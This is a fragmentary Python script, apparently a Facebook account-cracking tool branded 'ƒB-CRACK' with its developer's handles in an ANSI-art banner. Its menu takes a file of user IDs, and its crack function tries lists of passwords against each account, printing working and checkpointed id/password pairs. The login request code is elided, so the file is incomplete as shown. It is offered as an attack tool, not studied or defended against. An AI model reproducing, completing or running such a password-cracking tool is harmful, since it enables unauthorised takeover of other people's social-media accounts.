...
M2 = '\x1b[31m' # red
K2 = '\x1b[33m'	# background yellow
B2 = '\x1b[34m' # background blue
...
{P}│  {K2}██{B2}██████╗░█████╗░██████╗░██╗██████╗░██╗░░██╗  │\033[00m
{P}│  ╚══██╔{B2}══╝██╔══██╗██╔══██╗██║██╔══██╗██║░░██║  │\033[00m
{P}│  ░░░█{K2}█║{P}░░░{K2}█{B2}█║░░██║██████╦╝██║██████╔╝███████║  │\033[00m
{P}│  ░░░█{K2}█║{P}░░░{K2}█{M2}█║░░██║██╔══██╗██║██╔═══╝░██╔══██║  │\033[00m
{P}│  ░░░██║{M2}░░░╚█████╔╝██████╦╝██║██║░░░░░██║░░██║  │\033[00m
{P}│  {K2}░░{M2}░╚═╝░░░░╚════╝░╚═════╝░╚═╝╚═╝░░░░░╚═╝░░╚═╝  │\033[00m
{P}┗────────────────────────────────────────────────┛
             \x1b[47m \x1b[38;5;21mƒB-CRACK [T.P]\033[00m
             
\x1b[34m_______________

 \033[1;31m[\033[1;32m⊡\033[1;31m]\x1b[34m DEVELOPER :   TOBI-PH
 \033[1;31m[\033[1;32m⊡\033[1;31m]\x1b[33m FACEBOOK  :   \x1b[34mTOBI.PHcheat.ph
 \033[1;31m[\033[1;32m⊡\033[1;31m]\x1b[33m GITHUB    :   TOBIphcheat
 \033[1;31m[\033[1;32m⊡\033[1;31m]\x1b[33m TOOLS     :   \x1b[31mƒB-CRACK
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m VERSION   :  \x1b[31m V-20
\x1b[31m_____________________________________________________""")
...
def menu():
	clear()
	print(f"[{h}1{h}] {B2}FILE CRACK ")
	
	print(f"[{h}0{h}] {M2}Exit")
	me=input(f'\033[1;31m[\033[1;32m⊡\033[1;31m] {h} Choice : ')
	if me in ["1", "01"]:
		C1()
...
class D:
	...
	def plerr(self):
		...
		banner()
		try:
			print(f' \x1b[1;91m√\x1b[1;96m√\x1b[1;92m√ \033[47m\033[1;34m     Example: /sdcard/TOBIPH.txt     \033[40m\033[00m')
...
def Settings():
	...
	os.system("clear");banner()
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m ҒB MOBILE ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [TOBI-PH] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\r\x1b[31m [TOBIPH-CP] {idf} | {pw}')     
				print(led)
				...
				#print ()
				print(f'\r\r\x1b[1;92m TOBIPH-OK💉] '+idf+ ' | '+pw+'')
				print(led)
